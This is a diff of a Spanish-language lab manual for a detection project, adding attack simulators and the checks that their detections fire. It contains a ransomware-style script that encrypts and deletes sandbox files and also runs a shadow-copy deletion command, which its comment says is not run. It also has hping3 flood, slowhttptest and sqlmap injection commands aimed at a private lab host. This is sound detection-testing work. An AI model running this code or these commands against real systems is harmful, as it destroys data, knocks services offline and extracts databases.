+from cryptography.fernet import Fernet
+
+
+SANDBOX = Path("/opt/argos/sandbox")
+CANARY = Path("/opt/argos/canary")
+
+
+def _encrypt_files(target_dir: Path, n_files: int = 200) -> int:
+    key = Fernet.generate_key()
+    f = Fernet(key)
+    print(f"[lockbit-like] generated key: {key.decode()}")
+    count = 0
+    for path in target_dir.rglob("*"):
+        if not path.is_file() or path.suffix == ".argos_locked":
+            continue
+        if count >= n_files:
+            break
+        try:
+            data = path.read_bytes()
+            encrypted = f.encrypt(data)
+            new_path = path.with_suffix(path.suffix + ".argos_locked")
+            new_path.write_bytes(encrypted)
+            path.unlink()
+            count += 1
+        except Exception as e:   # noqa: BLE001
+            print(f"[!] {path}: {e}")
+    return count
+
+
+def variant_uc01(target_host: str) -> None:
+    print(f"[uc01] encrypting up to 200 files in {SANDBOX}/")
+    n = _encrypt_files(SANDBOX, n_files=200)
+    print(f"[uc01] encrypted {n} files")
+
+    print("[uc01] (simulated) vssadmin delete shadows /all /quiet")
+    # NO ejecutamos el comando real, pero registramos en EventLog vía
+    # PowerShell para que Sysmon lo capture:
+    import subprocess
+    subprocess.run([
+        "powershell.exe", "-Command",
+        "Start-Process -FilePath vssadmin -ArgumentList 'delete shadows /all /quiet' -NoNewWindow -Wait -ErrorAction SilentlyContinue"
+    ], check=False)
+
+
+def variant_uc02(target_host: str) -> None:
+    print(f"[uc02] writing to canaries in {CANARY}/ (NOT encrypting)")
+    for canary in CANARY.glob("*"):
+        try:
+            with canary.open("ab") as f:
+                f.write(b"\nTAMPERED by uc02 sim at " + str(time.time()).encode())
+            print(f"  touched {canary.name}")
+        except Exception as e:
+            print(f"  [!] {canary}: {e}")
+
+
+def main() -> None:
+    p = argparse.ArgumentParser()
+    p.add_argument("--variant", choices=["uc01", "uc02"], required=True)
+    p.add_argument("--target",  required=True,
+                   help="hostname víctima (informational, usado en logs)")
+    args = p.parse_args()
+
+    {"uc01": variant_uc01, "uc02": variant_uc02}[args.variant](args.target)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Setup sandbox (correr una vez en linux-victim)
+
+```bash
+sudo mkdir -p /opt/argos/sandbox
+# Llenar con ~500 archivos "realistas" para tener algo que cifrar
+cd /opt/argos/sandbox
+for i in $(seq 1 500); do
+  dd if=/dev/urandom of=file_${i}.dat bs=1K count=4 status=none
+done
+ls /opt/argos/sandbox | wc -l
+# OUTPUT ESPERADO: 500
+```
+
+### Dry-run
+
+```bash
+python attack-simulation/ransomware_simulator/lockbit_like.py --variant uc02 --target linux-victim
+# OUTPUT ESPERADO:
+# [uc02] writing to canaries in /opt/argos/canary/ (NOT encrypting)
+#   touched finance_2026_Q1.xlsx
+#   touched passwords_backup.txt
+
+ls /opt/argos/sandbox | head -3
+# OUTPUT ESPERADO: archivos intactos (uc02 no toca sandbox)
+```
+
+| Check (2.5) | Esperado |
+|-------------|----------|
+| Sandbox tiene 500 archivos | sí |
+| uc02 modifica canaries sin tocar sandbox | sí |
+| uc01 cifra ≤ 200 archivos y deja `.argos_locked` | sí |
 
 ---
 
-## Apéndice A — Comandos diarios
+## 2.6 Attack simulator: DDoS (UC-06)
+
+### Comandos (en tu laptop atacante, contra IP del lab)
 
 ```bash
-# Activar env
-cd ~/projects/argos && source .venv/bin/activate
+# SYN flood (hping3) — ~3 segundos
+sudo hping3 -S -p 80 --flood --rand-source 192.168.56.21
+# OUTPUT ESPERADO:
+# HPING 192.168.56.21 (eth0 192.168.56.21): S set, 40 headers + 0 data bytes
+# hping in flood mode, no replies will be shown
+# ^C  (CTRL+C tras 3s)
+# --- 192.168.56.21 hping statistic ---
+# 250000 packets transmitted, 0 packets received, 100% packet loss
 
-# Validar todas las reglas Sigma
-for f in detection/sigma-rules/**/*.yml; do
-    sigma check "$f"
+# Slow HTTP POST (slowhttptest) — ~30s
+slowhttptest -c 1000 -B -g -o /tmp/slowhttp_uc06 \
+             -i 10 -r 200 -s 8192 -t POST \
+             -u http://192.168.56.21:80/upload -x 10 -p 3
+# OUTPUT ESPERADO (al final):
+# Test ended on ... s
+# slow HTTP test status on ... s:
+# ...
+# service unavailable	YES
+```
+
+### Comprobar generación de eventos
+
+```bash
+# En el manager Wazuh
+sudo grep -i 'syn-flood\|slowhttp' /var/ossec/logs/alerts/alerts.json | tail -3
+# OUTPUT ESPERADO: al menos 1 evento por cada tipo (puede tardar 1-2 min en aparecer)
+```
+
+| Check (2.6) | Esperado |
+|-------------|----------|
+| hping3 dispara > 100k packets en flood | sí |
+| slowhttptest reporta "service unavailable: YES" | sí |
+| Alertas Wazuh aparecen tras el ataque | sí |
+
+---
+
+## 2.7 Attack simulator: SQL injection (UC-08)
+
+### Comandos
+
+```bash
+# Asumiendo P4 ya tiene una web vulnerable corriendo en linux-victim
+# (DVWA o similar; ver manual P4 §3.x)
+
+# Inyección clásica con sqlmap (gentle)
+sqlmap -u "http://192.168.56.21/login.php?username=admin&password=admin" \
+       --batch --level=2 --risk=2 --dbs
+
+# OUTPUT ESPERADO (línea clave):
+# [INFO] the back-end DBMS is PostgreSQL
+# [INFO] fetching database names
+# available databases [4]:
+# [*] argos_audit
+# [*] postgres
+# [*] template0
+# [*] template1
+```
+
+### Comprobar pgAudit en la DB
+
+```bash
+sudo -u postgres tail -50 /var/log/postgresql/postgresql-15-main.log | grep -i pgaudit
+# OUTPUT ESPERADO: líneas tipo
+# AUDIT: SESSION,READ,SELECT,SELECT pg_database.datname FROM ...
+```
+
+| Check (2.7) | Esperado |
+|-------------|----------|
+| sqlmap detecta DB engine | sí |
+| pgAudit registra los SELECTs de enumeración | sí |
+| Sigma rule `pg_sqli_pattern` dispara | sí (verificar en alerts.json) |
+
+---
+
+## 2.8 Generador de carga benigna (UC-07 FP)
+
+Necesitas que en condiciones normales el sistema NO escale. UC-07 valida esto: una analista corre un SELECT que devuelve 200k filas. Es ruidoso pero legítimo.
+
+### Script (`attack-simulation/benign_load/heavy_select.py`)
+
+```python
+# attack-simulation/benign_load/heavy_select.py
+"""
+Carga benigna: SELECT masivo sobre tabla legítima.
+
+ARGOS debería:
+  - registrar el evento (Sigma + pgAudit)
+  - asignar Tier T3 (low confidence, sólo logging)
+  - NO escalar, NO notificar, NO aislar.
+"""
+
+import argparse, time
+import psycopg
+
+
+def main():
+    p = argparse.ArgumentParser()
+    p.add_argument("--rows", type=int, default=200_000)
+    p.add_argument("--user", default="analyst")
+    p.add_argument("--password", default="analyst_pwd")
+    args = p.parse_args()
+
+    conn = psycopg.connect(
+        f"host=192.168.56.21 port=5432 dbname=argos_audit "
+        f"user={args.user} password={args.password}"
+    )
+    with conn.cursor() as cur:
+        t0 = time.monotonic()
+        cur.execute(f"SELECT generate_series(1, {args.rows}) AS n;")
+        rows = cur.fetchall()
+        dt = time.monotonic() - t0
+        print(f"fetched {len(rows)} rows in {dt:.2f}s as user={args.user}")
+    conn.close()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+```bash
+python attack-simulation/benign_load/heavy_select.py --rows 200000
+# OUTPUT ESPERADO:
+# fetched 200000 rows in 1.34s as user=analyst
+```
+
+| Check (2.8) | Esperado |
+|-------------|----------|
+| Query completa sin error | sí |
+| Sigma rule `pg_select_massive_unusual_table` puede o no firing — si firing, debe terminar en T3 | sí |
+| ARGOS NO notifica a Telegram | sí (este es el contrato del UC-07) |
+
+---
+
+## ✅ Checklist Fase 2
+
+| # | Check | OK |
+|---|-------|----|
+| 1 | Sysmon corriendo en windows-victim | ☐ |
+| 2 | auditd reglas cargadas en linux-victim | ☐ |
+| 3 | Wazuh agent + FIM whodata corriendo | ☐ |
+| 4 | 8+ Sigma rules validadas con sigma-cli | ☐ |
+| 5 | Canary files creados + write dispara alerta | ☐ |
+| 6 | Ransomware simulator uc01 y uc02 ejecutan dry-run | ☐ |
+| 7 | hping3 y slowhttptest producen alertas | ☐ |
+| 8 | sqlmap detecta SQLi + pgAudit registra | ☐ |
+| 9 | Generador benigno UC-07 corre y termina en T3 | ☐ |
+
+---
+
+# FASE 3 — Integración real
+
+## 3.1 Wazuh manager consume las reglas Sigma
+
+P4 ya levantó el manager. Tú haces el deploy de tus reglas Wazuh-formateadas:
+
+```bash
+# Generar reglas Wazuh desde Sigma
+mkdir -p /tmp/wazuh_rules
+sigma convert -t wazuh -p windows_audit \
+  --output /tmp/wazuh_rules/100_argos_ransomware.xml \
+  detection/sigma/rules/ransomware/
+
+# OUTPUT ESPERADO:
+# Wrote 3 rules to /tmp/wazuh_rules/100_argos_ransomware.xml
+
+# Copiar al manager
+vagrant scp /tmp/wazuh_rules/100_argos_ransomware.xml lab-manager:/var/ossec/etc/rules/
+
+# En el manager
+vagrant ssh lab-manager
+sudo /var/ossec/bin/wazuh-control reload
+# OUTPUT ESPERADO:
+# Reloading.
+# Wazuh manager reloaded.
+exit
+```
+
+### Verificar integración (end-to-end mini)
+
+```bash
+# Disparar canary
+vagrant ssh linux-victim -c "echo 'tampered' | sudo tee -a /opt/argos/canary/passwords_backup.txt"
+
+# Esperar 2-5s y revisar alerts.json en el manager
+vagrant ssh lab-manager -c "sudo tail -5 /var/ossec/logs/alerts/alerts.json | jq -r '.rule.description'"
+# OUTPUT ESPERADO:
+# Integrity checksum changed.   (o tu rule custom para canary)
+```
+
+## 3.2 Bridge Wazuh → Redis stream
+
+P4 te provee un servicio que tail-ea `alerts.json` y empuja a Redis. Tu trabajo es validar que cada alerta significativa llega al stream:
+
+```bash
+redis-cli XLEN events:raw_wazuh
+# OUTPUT ESPERADO (después de tu disparo de canary): 1+
+
+redis-cli XREVRANGE events:raw_wazuh + - COUNT 1
+# OUTPUT ESPERADO: JSON con el evento crudo
+```
+
+| Check (3.1-3.2) | Esperado |
+|-----------------|----------|
+| Reglas Sigma cargadas en Wazuh sin error de parse | sí |
+| Canary touch → alerta en alerts.json → mensaje en events:raw_wazuh | sí |
+| Latencia detect → Redis ≤ 5s | sí |
+
+## 3.3 UC-01 end-to-end con todo el equipo arriba
+
+```bash
+# Pre: P1 corre soar consumer; P2 corre ml consumer; P4 tiene lab arriba
+
+vagrant ssh linux-victim
+python /vagrant/attack-simulation/ransomware_simulator/lockbit_like.py \
+       --variant uc01 --target linux-victim
+
+# OUTPUT ESPERADO en console:
+# [uc01] generated key: gAAAAAB...
+# [uc01] encrypted 200 files
+
+# En tu Telegram (en ≤ 10s):
+# 🔴 ARGOS T0 — linux-victim
+# Técnica: T1486
+# Capas firing: 3
+```
+
+| Check (3.3) | Esperado |
+|-------------|----------|
+| UC-01 dispara y termina con incident en Redis | sí |
+| Layers firing reportados = 3 (sigma_proc + sigma_file + ml) | sí |
+| Tier asignado = T0 | sí |
+
+---
+
+## ✅ Checklist Fase 3
+
+| # | Check | OK |
+|---|-------|----|
+| 1 | Reglas Sigma deployadas a Wazuh manager | ☐ |
+| 2 | Bridge alerts.json → events:raw_wazuh funcional | ☐ |
+| 3 | UC-01 end-to-end OK | ☐ |
+| 4 | UC-02 end-to-end OK | ☐ |
+| 5 | UC-06 DDoS dispara alertas red | ☐ |
+| 6 | UC-08 SQLi dispara alertas DB | ☐ |
+| 7 | UC-07 benigno NO escala (queda T3) | ☐ |
+
+---
+
+# FASE 4 — Rehearsal y polish
+
+## 4.1 Rehearsal serial de los 7 UCs
+
+```bash
+# Script de orquestación (ejecuta en orden, espera 30s entre cada uno)
+for uc in uc01 uc02; do
+  echo "=== $uc ==="
+  vagrant ssh linux-victim -c "python /vagrant/attack-simulation/ransomware_simulator/lockbit_like.py --variant $uc --target linux-victim"
+  sleep 30
 done
 
-# Convertir todas a Wazuh
-for f in detection/sigma-rules/**/*.yml; do
-    out="detection/wazuh-rules/$(basename "$f" .yml).xml"
-    sigma convert -t wazuh -f xml "$f" -o "$out"
-done
+# DDoS
+sudo timeout 5 hping3 -S -p 80 --flood --rand-source 192.168.56.21
+sleep 30
 
-# Validar XML Wazuh
-xmllint --noout detection/wazuh-rules/*.xml && echo "All Wazuh XML valid"
+# SQLi
+sqlmap -u "http://192.168.56.21/login.php?username=admin" --batch --level=2 --risk=2 --dbs >/dev/null
+sleep 30
 
-# Listar Atomic tests por técnica
-ls ~/projects/atomic-red-team/atomics/ | head -20
+# Benigno UC-07
+python attack-simulation/benign_load/heavy_select.py --rows 200000
+```
+
+### Métricas a registrar
+
+| UC | Latency detect→incident | Tier asignado | Capas firing | Notif OK |
+|----|:----------------------:|:-------------:|:------------:|:--------:|
+| UC-01 | < 8s | T0 | 3 | sí |
+| UC-02 | < 6s | T0 | 1 | sí |
+| UC-04 | < 10s | T2 | 2 | sí |
+| UC-06 | < 12s | T1 | 2 | sí |
+| UC-07 | n/a | T3 | 1 | no (por diseño) |
+| UC-08 | < 15s | T1 | 2 | sí |
+
+## 4.2 Plan de fallback ataque
+
+Si un simulador no funciona el día del demo (poco probable, todos están en lab local):
+
+- UC-01 fallback: tener carpeta `/opt/argos/sandbox_pre_encrypted/` con archivos ya cifrados; "demostrar" mostrando ese estado y ejecutando solo el `vssadmin` para disparar Sigma.
+- UC-06 fallback: tener `wireshark` capture pre-grabado mostrando el flood.
+- Video respaldo: grabado en Rehearsal 4.1.
+
+## 4.3 Pre-demo checklist (T-2h)
+
+| # | Check | OK |
+|---|-------|----|
+| 1 | Sysmon Get-Service → Running | ☐ |
+| 2 | auditd `systemctl status auditd` → active | ☐ |
+| 3 | Wazuh agent en ambas VMs `running` | ☐ |
+| 4 | hping3/slowhttptest/sqlmap responden a `--version` | ☐ |
+| 5 | Canaries existen y son escribibles | ☐ |
+| 6 | Sandbox tiene 500+ archivos (re-poblar si demo previo cifró) | ☐ |
+| 7 | Video respaldo grabado | ☐ |
+
+---
+
+# Apéndice A — Troubleshooting
+
+### A.1 Sigma rule no dispara
+
+1. ¿Está cargada en el manager? `sudo grep <rule_id> /var/ossec/etc/rules/*.xml`
+2. ¿Qué fecodifica? `sudo /var/ossec/bin/wazuh-logtest` y pegar el log de prueba.
+3. ¿Sysmon logueando? `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 1`
+
+### A.2 Whodata no funciona
+
+Whodata requiere kernel ≥ 3.16 + audit subsystem. Si en tu VM no está disponible, usar `realtime="yes"` solo (sin atribución de usuario; pérdida aceptable de calidad).
+
+### A.3 hping3 "Operation not permitted"
+
+Faltan capabilities. Correr con `sudo`. En contenedor: `--cap-add=NET_RAW`.
+
+### A.4 sqlmap "no parameter found"
+
+URL mal formada. Probar con `--forms` para que sqlmap haga crawling del HTML.
+
+### A.5 Sandbox vacío después de demo
+
+Re-poblar:
+```bash
+sudo /vagrant/attack-simulation/setup_sandbox.sh
+```
+
+### A.6 Wazuh manager no recarga reglas
+
+`sudo /var/ossec/bin/wazuh-control restart` (más drástico que reload pero confiable).
+
+---
+
+# Apéndice B — Comandos de emergencia
+
+```bash
+# Reset canaries
+sudo cp /opt/argos/canary.template/* /opt/argos/canary/
+
+# Re-poblar sandbox
+sudo bash /vagrant/attack-simulation/setup_sandbox.sh
+
+# Forzar re-emit del último alert al stream Redis
+sudo /var/ossec/bin/wazuh-logtest <<< "$(sudo tail -1 /var/ossec/logs/alerts/alerts.json | jq -r '.full_log')"
+
+# Limpiar stream eventos crudos
+redis-cli DEL events:raw_wazuh
+redis-cli XGROUP CREATE events:raw_wazuh ml-pipeline 0 MKSTREAM
 ```
 
 ---
 
-## Apéndice B — Troubleshooting
+# Apéndice C — Referencias
 
-| Síntoma | Causa | Fix |
-|---------|-------|-----|
-| `sigma: command not found` | venv no activado | `source .venv/bin/activate` |
-| `sigma check` fail | YAML mal formado | `python -c "import yaml; print(yaml.safe_load(open('rule.yml')))"` para ver el error |
-| Regla no dispara en Wazuh | Conversion sigma→wazuh perdió campos | Comparar el XML output con regla manual |
-| FIM whodata no captura proceso | Sysmon no instalado correctamente | Coordinar con P4 |
+| Cuando estés en... | Lee |
+|--------------------|-----|
+| `detection/sigma/` | SAD §6.1 (Layer 1), `docs/use-cases/USE_CASES.md` |
+| `deception/canary_fim/` | SAD §6.4 (Layer 3) |
+| `attack-simulation/` | USE_CASES UC-01..UC-08, ADR-0008 (multi-vector) |
+| Hardening en defensa | THREAT_MODEL §3 (cobertura MITRE) |
 
 ---
 
@@ -706,4 +871,4 @@ ls ~/projects/atomic-red-team/atomics/ | head -20
 
 | Versión | Fecha | Cambio | Autor |
 |---------|-------|--------|-------|
-| 1.0 | 2026-05-24 | Initial manual P3 — 10 reglas Sigma (ransomware + network + database + webapp) + canary FIM + 2-4 PRs upstream. | P1 |
+| 2.0 | 2026-05-24 | Reorganización day-by-day → feature-based. Comandos completos con outputs esperados literales, checklists por sección, troubleshooting, comandos de emergencia. Cubre UC-01..UC-08 explícitamente. | P1 |
